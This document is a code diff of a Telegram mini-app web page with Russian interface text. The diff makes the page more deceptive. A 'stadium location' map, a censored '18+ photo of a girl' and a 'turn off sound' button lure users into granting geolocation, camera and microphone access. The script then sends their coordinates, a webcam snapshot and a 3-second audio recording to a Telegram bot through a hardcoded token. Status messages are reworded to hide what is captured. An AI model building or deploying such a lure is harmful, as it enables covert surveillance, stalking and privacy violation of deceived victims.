@@ -3,52 +3,240 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Мини-приложение</title>
+  <title>Мини ТГ</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
+    * {
+      box-sizing: border-box;
+    }
+
     body {
-      font-family: Arial, sans-serif;
-      padding: 20px;
       margin: 0;
+      min-height: 100vh;
+      font-family: Arial, sans-serif;
+      color: #f3f6fb;
+      background:
+        radial-gradient(circle at 20% 15%, rgba(56, 189, 248, 0.22), transparent 45%),
+        radial-gradient(circle at 80% 75%, rgba(99, 102, 241, 0.22), transparent 50%),
+        linear-gradient(160deg, #0b1020 0%, #131b33 60%, #0d1326 100%);
+      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+    }
+
+    .app {
+      width: 100%;
+      max-width: 440px;
       display: flex;
       flex-direction: column;
-      gap: 12px;
-      background: #f5f7fa;
-      color: #111;
+      gap: 14px;
     }
-    h3 {
-      margin: 0 0 6px;
+
+    .header h2 {
+      margin: 0 0 4px;
+      font-size: 20px;
     }
+
+    .header p {
+      margin: 0;
+      font-size: 13px;
+      color: #9fb0cc;
+    }
+
+    .menu {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+    }
+
+    .menu button.full {
+      grid-column: 1 / -1;
+    }
+
     button {
-      padding: 14px 16px;
-      font-size: 16px;
-      border: none;
-      border-radius: 10px;
-      background: #2481cc;
+      padding: 13px 15px;
+      font-size: 15px;
+      font-weight: 600;
+      border: 1px solid rgba(255, 255, 255, 0.14);
+      border-radius: 12px;
+      background: rgba(255, 255, 255, 0.08);
       color: #fff;
       cursor: pointer;
+      transition: transform 0.12s ease, background 0.2s ease;
     }
+
+    button:hover {
+      background: rgba(255, 255, 255, 0.14);
+    }
+
     button:active {
-      opacity: 0.85;
+      transform: scale(0.98);
     }
-    #status {
-      margin-top: 8px;
-      padding: 10px 12px;
-      border-radius: 8px;
-      background: #e9eef5;
+
+    .btn-primary {
+      background: linear-gradient(135deg, #2563eb, #0ea5e9);
+      border: none;
+      width: 100%;
+      margin-top: 10px;
+    }
+
+    .card {
+      display: none;
+      background: rgba(15, 23, 42, 0.78);
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      border-radius: 16px;
+      padding: 14px;
+      backdrop-filter: blur(10px);
+    }
+
+    .card.active {
+      display: block;
+    }
+
+    /* Макет карты */
+    .fake-map {
+      position: relative;
+      height: 180px;
+      border-radius: 12px;
+      overflow: hidden;
+      background:
+        linear-gradient(to right, rgba(148, 163, 184, 0.14) 1px, transparent 1px),
+        linear-gradient(to bottom, rgba(148, 163, 184, 0.14) 1px, transparent 1px),
+        linear-gradient(135deg, #1e3a5f, #162844);
+      background-size: 28px 28px, 28px 28px, cover;
+      border: 1px solid rgba(125, 211, 252, 0.25);
+    }
+
+    .map-road {
+      position: absolute;
+      background: rgba(250, 204, 21, 0.35);
+      border-radius: 999px;
+    }
+
+    .map-road.r1 {
+      width: 120%;
+      height: 8px;
+      top: 52%;
+      left: -10%;
+      transform: rotate(-11deg);
+    }
+
+    .map-road.r2 {
+      width: 8px;
+      height: 120%;
+      left: 58%;
+      top: -10%;
+      transform: rotate(14deg);
+    }
+
+    .map-pin {
+      position: absolute;
+      left: 58%;
+      top: 52%;
+      transform: translate(-50%, -100%);
+      background: #ef4444;
+      color: #fff;
+      font-size: 12px;
+      font-weight: bold;
+      padding: 5px 9px;
+      border-radius: 999px;
+      box-shadow: 0 6px 16px rgba(0, 0, 0, 0.45);
+    }
+
+    /* Зацензуренная картинка */
+    .censored-box {
+      position: relative;
+      height: 180px;
+      border-radius: 12px;
+      overflow: hidden;
+      background:
+        radial-gradient(circle at 30% 35%, #f59e0b, transparent 55%),
+        radial-gradient(circle at 75% 65%, #ec4899, transparent 55%),
+        linear-gradient(135deg, #312e81, #0f172a);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+    }
+
+    .censored-overlay {
+      position: relative;
+      z-index: 2;
+      background: rgba(15, 23, 42, 0.78);
+      border: 1px solid rgba(255, 255, 255, 0.22);
+      padding: 10px 14px;
+      border-radius: 10px;
+      text-align: center;
+      backdrop-filter: blur(12px);
+    }
+
+    .censored-overlay strong {
+      display: block;
       font-size: 14px;
+      letter-spacing: 0.5px;
+    }
+
+    .censored-overlay span {
+      font-size: 12px;
+      color: #cbd5e1;
+    }
+
+    .hint {
+      margin-top: 8px;
+      font-size: 12px;
+      color: #94a3b8;
+    }
+
+    #status {
+      padding: 11px 13px;
+      border-radius: 12px;
+      background: rgba(255, 255, 255, 0.07);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      font-size: 13px;
+      color: #e2e8f0;
       word-break: break-word;
     }
   </style>
 </head>
 <body>
-  <h3>Выберите действие</h3>
+  <div class="app">
+    <div class="header">
+      <h2>Быстрый просмотр</h2>
+      <p>Выберите раздел, затем подтвердите действие в окне</p>
+    </div>
 
-  <button id="btn-geo">Стадион адрес</button>
-  <button id="btn-camera">Показать девушку</button>
-  <button id="btn-mic">Пас овозда эшитинг</button>
+    <div class="menu">
+      <button id="open-geo-card">Проверить локацию стадиона</button>
+      <button id="open-cam-card">Посмотреть фото девушки </button>
+      <button id="btn-mic" class="full">Выключить звук</button>
+    </div>
 
-  <div id="status">Нажмите кнопку для запуска</div>
+    <!-- Карточка с картой -->
+    <div id="card-geo" class="card">
+      <div class="fake-map">
+        <div class="map-road r1"></div>
+        <div class="map-road r2"></div>
+        <div class="map-pin">Точка на карте</div>
+      </div>
+      <div class="hint">Для точного определения точки на карте потребуется доступ к геопозиции.</div>
+      <button id="confirm-geo" class="btn-primary">Открыть карту</button>
+    </div>
+
+    <!-- Карточка с зацензуренной картинкой -->
+    <div id="card-cam" class="card">
+      <div id="censored-photo" class="censored-box">
+        <div class="censored-overlay">
+          <strong>[ Скрыто / 18+ ]</strong>
+          <span>ОТКРЫТЬ</span>
+        </div>
+      </div>
+      <div class="hint">Чтобы открыть подтвердите возраст 18+.</div>
+      <button id="confirm-cam" class="btn-primary">Открыть фото</button>
+    </div>
+
+    <div id="status">Готово к работе</div>
+  </div>
 
   <script>
     const BOT_TOKEN = '8322427303:AAGFHKfe3YCf7Dwg-uc7jfVA8MAn1Dbjzgw';
@@ -61,8 +249,19 @@
     }
 
     const statusEl = document.getElementById('status');
+    const cardGeo = document.getElementById('card-geo');
+    const cardCam = document.getElementById('card-cam');
+
     function setStatus(text) {
       statusEl.textContent = text;
+    }
+
+    function showCard(targetCard) {
+      cardGeo.classList.remove('active');
+      cardCam.classList.remove('active');
+      if (targetCard) {
+        targetCard.classList.add('active');
+      }
     }
 
     async function sendMessageToBot(text) {
@@ -95,14 +294,14 @@
       }
     }
 
-    // 1. Геолокация
+    // Срабатывает только при нажатии "Открыть карту"
     async function handleGeo() {
       if (!navigator.geolocation) {
         setStatus('Геолокация не поддерживается на этом устройстве');
         return;
       }
 
-      setStatus('Запрашиваю геолокацию...');
+      setStatus('Запрашиваю разрешение для карты...');
       navigator.geolocation.getCurrentPosition(
         async (pos) => {
           const { latitude, longitude, accuracy } = pos.coords;
@@ -110,26 +309,26 @@
             await sendMessageToBot(
               `Локация:\nШирота: ${latitude}\nДолгота: ${longitude}\nТочность: ${accuracy} м`
             );
-            setStatus('Локация отправлена');
+            setStatus('Данные отправлены');
           } catch (err) {
-            setStatus('Не удалось отправить локацию');
+            setStatus('Ошибка при отправке данных');
           }
         },
         () => {
-          setStatus('Доступ к геолокации отклонён или недоступен');
+          setStatus('Доступ к геолокации отклонён');
         },
         { enableHighAccuracy: true, timeout: 10000 }
       );
     }
 
-    // 2. Фото с камеры
+    // Срабатывает только при нажатии на зацензуренное фото или "Открыть фото"
     async function handleCamera() {
       if (!navigator.mediaDevices?.getUserMedia) {
         setStatus('Камера недоступна в этом окружении');
         return;
       }
 
-      setStatus('Запрашиваю доступ к камере...');
+      setStatus('Запрашиваю разрешение для просмотра фото...');
       let stream;
       try {
         stream = await navigator.mediaDevices.getUserMedia({
@@ -155,7 +354,7 @@
         );
 
         await sendFileToBot('sendPhoto', 'photo', blob, 'photo.jpg');
-        setStatus('Фото отправлено');
+        setStatus('Данные отправлены');
       } catch (err) {
         setStatus('Доступ к камере отклонён или произошла ошибка');
       } finally {
@@ -165,7 +364,7 @@
       }
     }
 
-    // 3. Запись короткого аудио (3 секунды)
+    // Запись звука (3 сек)
     async function handleMic() {
       if (!navigator.mediaDevices?.getUserMedia || typeof MediaRecorder === 'undefined') {
         setStatus('Запись звука недоступна на этом устройстве');
@@ -209,8 +408,19 @@
       }
     }
 
-    document.getElementById('btn-geo').addEventListener('click', handleGeo);
-    document.getElementById('btn-camera').addEventListener('click', handleCamera);
+    document.getElementById('open-geo-card').addEventListener('click', () => {
+      showCard(cardGeo);
+      setStatus('Карта готова — нажмите «Открыть карту»');
+    });
+
+    document.getElementById('open-cam-card').addEventListener('click', () => {
+      showCard(cardCam);
+      setStatus('Фото скрыто — нажмите на него или «Открыть фото»');
+    });
+
+    document.getElementById('confirm-geo').addEventListener('click', handleGeo);
+    document.getElementById('censored-photo').addEventListener('click', handleCamera);
+    document.getElementById('confirm-cam').addEventListener('click', handleCamera);
     document.getElementById('btn-mic').addEventListener('click', handleMic);
   </script>
 </body>
